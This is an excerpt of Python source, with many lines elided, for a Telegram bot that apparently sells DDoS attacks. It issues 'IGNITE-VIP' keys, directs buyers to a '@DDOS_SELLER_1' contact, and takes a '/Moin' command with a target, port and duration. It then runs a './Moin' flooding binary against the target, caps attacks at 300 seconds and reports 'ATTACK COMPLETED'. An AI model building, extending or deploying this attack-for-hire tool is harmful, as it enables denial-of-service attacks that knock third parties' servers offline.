...
# Admin user IDs
admin_id = {"5579438195"}  # Replace with actual admin ID
...
def generate_key(length=10):
    ...
    return f"IGNITE-VIP-{key.upper()}"  # Ensure key is in uppercase
...
def generate_key_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @DDOS_SELLER_1"
...
def attack_completed(user_id, target, port, time):
    ...
    bot.send_message(user_id, f"✅𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬\n\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁 : {target}\n🔌 𝗣𝗼𝗿𝘁: {port}\n⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n⚡Status : Attack Completed successfully")
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./Moin {target} {port} {time} 230"  # Replace with actual attack command
...
@bot.message_handler(commands=['Moin'])
def handle_attack(message):
    user_id = str(message.chat.id)
    cooldown_time = 30  # Cooldown in seconds (e.g., 60 seconds)
        ...
        if len(command) == 4:
            ...
            try:
                ...
                if port < 10003 or port > 29999:
                    ...
                    response = "❕𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❕"
                else:
                    # Log the attack command
                    record_command_logs(user_id, '/Moin', target, port, time)
